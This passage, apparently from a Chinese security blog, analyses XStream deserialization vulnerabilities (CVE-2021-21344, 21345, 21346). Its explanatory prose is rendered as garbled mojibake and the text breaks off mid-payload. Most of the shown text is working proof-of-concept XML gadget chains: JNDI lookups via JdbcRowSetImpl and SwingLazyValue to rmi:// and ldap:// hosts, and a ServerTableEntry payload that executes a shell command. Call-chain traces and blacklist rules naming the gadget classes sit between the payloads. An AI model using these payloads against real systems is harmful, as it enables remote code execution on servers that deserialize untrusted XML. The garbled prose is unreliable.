<span class="tag">&lt;<span class="name">rowSetType</span>&gt;</span>1004<span class="tag">&lt;/<span class="name">rowSetType</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">showDeleted</span>&gt;</span>false<span class="tag">&lt;/<span class="name">showDeleted</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">dataSource</span>&gt;</span>rmi://localhost:15000/CallRemoteMethod<span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">params</span>/&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">javax.sql.rowset.BaseRowSet</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">int</span>&gt;</span>-1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">iMatchColumns</span>&gt;</span></span><br><span class="line">                      <span class="tag">&lt;<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">string</span>&gt;</span>foo<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                        <span class="tag">&lt;<span class="name">null</span>/&gt;</span></span><br><span class="line">                      <span class="tag">&lt;/<span class="name">strMatchColumns</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">com.sun.rowset.JdbcRowSetImpl</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">jaxbObject</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">dataSource</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">message</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">satellites</span>/&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">invocationProperties</span>/&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">packet</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">indexMap</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">comparator</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">int</span>&gt;</span>3<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">string</span>&gt;</span>javax.xml.ws.binding.attachments.inbound<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">java.util.PriorityQueue</span>&gt;</span></span><br></pre></td></tr></table></figure><h3 id="åˆ†æ"><a href="#åˆ†æ" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>ä»POCä¸­å¯ä»¥çœ‹å‡º</p><ol><li>æœ€ç»ˆçš„RCEè§¦å‘ç‚¹æ˜¯JdbcRowSetImpl jndiç±»å‹æ³¨å…¥æ¼æ´</li><li>å‡ºå‘ç‚¹æ˜¯PriorityQueueè‡ªåŠ¨è°ƒç”¨compareæ–¹æ³•</li></ol><p>PriorityQueueè¿™ä¸ªä¹Ÿæ˜¯ccé“¾ä¸­è¢«ç”¨åˆ°çš„ï¼ŒPriorityQueueå®ç°äº†Serializableï¼Œä¸”é‡å†™äº†readObjectã€‚</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in size, and any hidden stuff</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in (and discard) array length</span></span><br><span class="line">    s.readInt();</span><br><span class="line"></span><br><span class="line">    queue = <span class="keyword">new</span> Object[size];</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i = <span class="number">0</span>; i &lt; size; i++)</span><br><span class="line">        queue[i] = s.readObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Elements are guaranteed to be in &quot;proper order&quot;, but the</span></span><br><span class="line">    <span class="comment">// spec has never explained what that might be.</span></span><br><span class="line">    heapify();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>heapify æ˜¯ä¸ªæ’åºæ“ä½œï¼Œè°ƒç”¨äº†æ¯ä¸ªkeyçš„compareæ–¹æ³•</p><p>å…·ä½“çš„è°ƒç”¨é“¾å¦‚ä¸‹</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">java.util.PriorityQueue#heapify</span><br><span class="line">  sun.awt.datatransfer.DataTransferer$IndexOrderComparator#compare</span><br><span class="line">    com.sun.xml.internal.ws.client.ResponseContext#get</span><br><span class="line">      com.sun.xml.internal.ws.api.message.MessageWrapper#getAttachments</span><br><span class="line">        com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getAttachments</span><br><span class="line">          com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart#getMessage</span><br><span class="line">            com.sun.xml.internal.ws.message.JAXBAttachment#getInputStream</span><br><span class="line">              com.sun.xml.internal.ws.message.JAXBAttachment#asInputStream</span><br><span class="line">                com.sun.xml.internal.ws.message.JAXBAttachment#writeTo</span><br><span class="line">                  com.sun.xml.internal.ws.db.glassfish.BridgeWrapper#marshal</span><br><span class="line">                    com.sun.xml.internal.bind.api.Bridge#marshal</span><br><span class="line">                      com.sun.xml.internal.bind.v2.runtime.BridgeImpl#marshal</span><br><span class="line">                        com.sun.xml.internal.bind.v2.runtime.MarshallerImpl#write</span><br><span class="line">                          com.sun.xml.internal.bind.v2.runtime.XMLSerializer#childAsXsiType</span><br><span class="line">                            com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl#serializeURIs</span><br><span class="line">                              com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</span><br><span class="line">                                com.sun.rowset.JdbcRowSetImpl#getDatabaseMetaData</span><br><span class="line">                                  com.sun.rowset.JdbcRowSetImpl#connect</span><br></pre></td></tr></table></figure><p>ä¸ªäººè®¤ä¸ºè¿™ä¸ªå…³é”®åˆ©ç”¨ç‚¹æ˜¯com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection#get</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">final</span> Method getter;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> ValueT <span class="title">get</span><span class="params">(BeanT bean)</span> <span class="keyword">throws</span> AccessorException </span>&#123;</span><br><span class="line">           <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="comment">// æ­¤å¤„å¯ä»¥ä»»æ„æ‰§è¡Œ</span></span><br><span class="line">               <span class="keyword">return</span> <span class="keyword">this</span>.getter.invoke(bean);</span><br><span class="line">           &#125; <span class="keyword">catch</span> (IllegalAccessException var3) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalAccessError(var3.getMessage());</span><br><span class="line">           &#125; <span class="keyword">catch</span> (InvocationTargetException var4) &#123;</span><br><span class="line">               <span class="keyword">throw</span> <span class="keyword">this</span>.handleInvocationTargetException(var4);</span><br><span class="line">           &#125;</span><br><span class="line">       &#125;</span><br></pre></td></tr></table></figure><p>åœ¨JavaåŸç”Ÿååºåˆ—åŒ–ä¸­ï¼Œè¿™é‡ŒéSerializableå¹¶æ²¡æœ‰é—®é¢˜ï¼Œä½†æ˜¯XStreamä¸å—é™åˆ¶æ‰€æœ‰ç±»éƒ½å¯ä»¥å®ä¾‹åŒ–ï¼Œå¯¼è‡´äº†ä¸­é—´å¯ä»¥æœ‰å¾ˆå¤šèŠ‚ç‚¹å¯ä»¥ç”¨æ¥ä½œä¸ºæ„é€ é“¾çš„èŠ‚ç‚¹ã€‚</p><h3 id="é»‘åå•ï¼š-1"><a href="#é»‘åå•ï¼š-1" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">denyTypeHierarchyDynamically(<span class="string">&quot;javax.sql.rowset.BaseRowSet&quot;</span>);</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21345"><a href="#CVE-2021-21345" class="headerlink" title="CVE-2021-21345"></a>CVE-2021-21345</h2><p>authorï¼šé’Ÿå¸ˆå‚…</p><h3 id="POC-1"><a href="#POC-1" class="headerlink" title="POC"></a>POC</h3><figure class="highlight"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line">&lt;java.util.PriorityQueue serialization=<span class="string">&#x27;custom&#x27;</span>&gt;</span><br><span class="line">  &lt;unserializable-parents/&gt;</span><br><span class="line">  &lt;java.util.PriorityQueue&gt;</span><br><span class="line">    &lt;<span class="keyword">default</span>&gt;</span><br><span class="line">      &lt;size&gt;2&lt;/size&gt;</span><br><span class="line">      &lt;comparator <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;sun.awt.datatransfer.DataTransferer$IndexOrderComparator&#x27;</span>&gt;</span><br><span class="line">        &lt;indexMap <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.client.ResponseContext&#x27;</span>&gt;</span><br><span class="line">          &lt;packet&gt;</span><br><span class="line">            &lt;message <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.encoding.xml.XMLMessage$XMLMultiPart&#x27;</span>&gt;</span><br><span class="line">              &lt;dataSource <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.message.JAXBAttachment&#x27;</span>&gt;</span><br><span class="line">                &lt;bridge <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.ws.db.glassfish.BridgeWrapper&#x27;</span>&gt;</span><br><span class="line">                  &lt;bridge <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.BridgeImpl&#x27;</span>&gt;</span><br><span class="line">                    &lt;bi <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.ClassBeanInfoImpl&#x27;</span>&gt;</span><br><span class="line">                      &lt;jaxbType&gt;com.sun.corba.se.impl.activation.ServerTableEntry&lt;/jaxbType&gt;</span><br><span class="line">                      &lt;uriProperties/&gt;</span><br><span class="line">                      &lt;attributeProperties/&gt;</span><br><span class="line">                      &lt;inheritedAttWildcard <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.reflect.Accessor$GetterSetterReflection&#x27;</span>&gt;</span><br><span class="line">                        &lt;getter&gt;</span><br><span class="line">                          &lt;<span class="class"><span class="keyword">class</span>&gt;<span class="title">com</span>.<span class="title">sun</span>.<span class="title">corba</span>.<span class="title">se</span>.<span class="title">impl</span>.<span class="title">activation</span>.<span class="title">ServerTableEntry</span>&lt;/<span class="title">class</span>&gt;</span></span><br><span class="line"><span class="class">                          &lt;<span class="title">name</span>&gt;<span class="title">verify</span>&lt;/<span class="title">name</span>&gt;</span></span><br><span class="line"><span class="class">                          &lt;<span class="title">parameter</span>-<span class="title">types</span>/&gt;</span></span><br><span class="line"><span class="class">                        &lt;/<span class="title">getter</span>&gt;</span></span><br><span class="line"><span class="class">                      &lt;/<span class="title">inheritedAttWildcard</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;/<span class="title">bi</span>&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">tagName</span>/&gt;</span></span><br><span class="line"><span class="class">                    &lt;<span class="title">context</span>&gt;</span></span><br><span class="line"><span class="class">                      &lt;<span class="title">marshallerPool</span> <span class="title">class</span></span>=<span class="string">&#x27;com.sun.xml.internal.bind.v2.runtime.JAXBContextImpl$1&#x27;</span>&gt;</span><br><span class="line">                        &lt;outer-<span class="class"><span class="keyword">class</span> <span class="title">reference</span></span>=<span class="string">&#x27;../..&#x27;</span>/&gt;</span><br><span class="line">                      &lt;/marshallerPool&gt;</span><br><span class="line">                      &lt;nameList&gt;</span><br><span class="line">                        &lt;nsUriCannotBeDefaulted&gt;</span><br><span class="line">                          &lt;boolean&gt;true&lt;/boolean&gt;</span><br><span class="line">                        &lt;/nsUriCannotBeDefaulted&gt;</span><br><span class="line">                        &lt;namespaceURIs&gt;</span><br><span class="line">                          &lt;string&gt;1&lt;/string&gt;</span><br><span class="line">                        &lt;/namespaceURIs&gt;</span><br><span class="line">                        &lt;localNames&gt;</span><br><span class="line">                          &lt;string&gt;UTF-8&lt;/string&gt;</span><br><span class="line">                        &lt;/localNames&gt;</span><br><span class="line">                      &lt;/nameList&gt;</span><br><span class="line">                    &lt;/context&gt;</span><br><span class="line">                  &lt;/bridge&gt;</span><br><span class="line">                &lt;/bridge&gt;</span><br><span class="line">                &lt;jaxbObject <span class="class"><span class="keyword">class</span></span>=<span class="string">&#x27;com.sun.corba.se.impl.activation.ServerTableEntry&#x27;</span>&gt;</span><br><span class="line">                  &lt;activationCmd&gt;open /Applications/Calculator.app&lt;/activationCmd&gt;</span><br><span class="line">                &lt;/jaxbObject&gt;</span><br><span class="line">              &lt;/dataSource&gt;</span><br><span class="line">            &lt;/message&gt;</span><br><span class="line">            &lt;satellites/&gt;</span><br><span class="line">            &lt;invocationProperties/&gt;</span><br><span class="line">          &lt;/packet&gt;</span><br><span class="line">        &lt;/indexMap&gt;</span><br><span class="line">      &lt;/comparator&gt;</span><br><span class="line">    &lt;/default&gt;</span><br><span class="line">    &lt;int&gt;3&lt;/int&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">    &lt;string&gt;javax.xml.ws.binding.attachments.inbound&lt;/string&gt;</span><br><span class="line">  &lt;/java.util.PriorityQueue&gt;</span><br><span class="line">&lt;/java.util.PriorityQueue&gt;</span><br></pre></td></tr></table></figure><h3 id="åˆ†æ-1"><a href="#åˆ†æ-1" class="headerlink" title="åˆ†æ"></a>åˆ†æ</h3><p>é•¿å¾—å¾ˆåƒï¼Œå‡ºå‘ç‚¹æ˜¯ä¸€æ ·çš„PriorityQueueï¼ŒRCEè§¦å‘ç‚¹æ˜¯com.sun.corba.se.impl.activation.ServerTableEntry</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line">   <span class="keyword">private</span> String activationCmd;</span><br><span class="line">   <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">verify</span><span class="params">()</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line"></span><br><span class="line">           <span class="keyword">if</span> (debug)</span><br><span class="line">               System.out.println(<span class="string">&quot;Server being verified w/&quot;</span> + activationCmd);</span><br><span class="line"></span><br><span class="line">           process = Runtime.getRuntime().exec(activationCmd);</span><br><span class="line">           <span class="keyword">int</span> result = process.waitFor();</span><br><span class="line">           ...</span><br><span class="line">           </span><br><span class="line">   <span class="comment">//synchronized æ˜¯åŒæ­¥é”</span></span><br><span class="line"><span class="function"><span class="keyword">synchronized</span> <span class="keyword">void</span> <span class="title">activate</span><span class="params">()</span> <span class="keyword">throws</span> org.omg.CORBA.SystemException</span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       state = ACTIVATED;</span><br><span class="line"></span><br><span class="line">       <span class="keyword">try</span> &#123;</span><br><span class="line">           <span class="keyword">if</span> (debug)</span><br><span class="line">               printDebug(<span class="string">&quot;activate&quot;</span>, <span class="string">&quot;activating server&quot;</span>);</span><br><span class="line">           process = Runtime.getRuntime().exec(activationCmd);</span><br><span class="line">       &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">       ..</span><br></pre></td></tr></table></figure><h3 id="é»‘åå•ï¼š-2"><a href="#é»‘åå•ï¼š-2" class="headerlink" title="é»‘åå•ï¼š"></a>é»‘åå•ï¼š</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">com.sun.corba.se.impl.activation.ServerTableEntry</span><br><span class="line"><span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> Pattern GETTER_SETTER_REFLECTION = Pattern.compile(<span class="string">&quot;.*\\$GetterSetterReflection&quot;</span>);</span><br></pre></td></tr></table></figure><h2 id="CVE-2021-21346"><a href="#CVE-2021-21346" class="headerlink" title="CVE-2021-21346"></a>CVE-2021-21346</h2><p>author: wh1t3p1g</p><h3 id="POC-2"><a href="#POC-2" class="headerlink" title="POC"></a>POC</h3><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">sorted-set</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">type</span>&gt;</span>ysomap<span class="tag">&lt;/<span class="name">type</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">value</span> <span class="attr">class</span>=<span class="string">&#x27;javax.swing.MultiUIDefaults&#x27;</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">int</span>&gt;</span>0<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">defaultLocale</span>&gt;</span>zh_CN<span class="tag">&lt;/<span class="name">defaultLocale</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;<span class="name">tables</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span> <span class="attr">serialization</span>=<span class="string">&#x27;custom&#x27;</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">unserializable-parents</span>/&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">hashtable</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">loadFactor</span>&gt;</span>0.75<span class="tag">&lt;/<span class="name">loadFactor</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">threshold</span>&gt;</span>525<span class="tag">&lt;/<span class="name">threshold</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>700<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">int</span>&gt;</span>1<span class="tag">&lt;/<span class="name">int</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">string</span>&gt;</span>lazyValue<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">className</span>&gt;</span>javax.naming.InitialContext<span class="tag">&lt;/<span class="name">className</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">methodName</span>&gt;</span>doLookup<span class="tag">&lt;/<span class="name">methodName</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">args</span>&gt;</span></span><br><span class="line">                    <span class="tag">&lt;<span class="name">string</span>&gt;</span>ldap://localhost:1099/CallRemoteMethod<span class="tag">&lt;/<span class="name">string</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;/<span class="name">args</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">sun.swing.SwingLazyValue</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">hashtable</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">default</span>&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">defaultLocale</span> <span class="attr">reference</span>=<span class="string">&#x27;../../../../../../../javax.swing.UIDefaults/default/defaultLocale&#x27;</span>/&gt;</span></span><br><span class="line">                  <span class="tag">&lt;<span class="name">resourceCache</span>/&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">              <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">javax.swing.UIDefaults</span>&gt;</span></span><br><span class="line">          <span class="tag">&lt;/<span class="name">tables</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">default</span>&gt;</span></span><br><span class="line">      <span class="tag">&lt;/<span class="name">javax.swing.MultiUIDefaults</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;/<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">  <span class="tag">&lt;<span class="name">javax.naming.ldap.Rdn_-RdnEntry</span>&gt;</span></span><br><span class="line">    <span 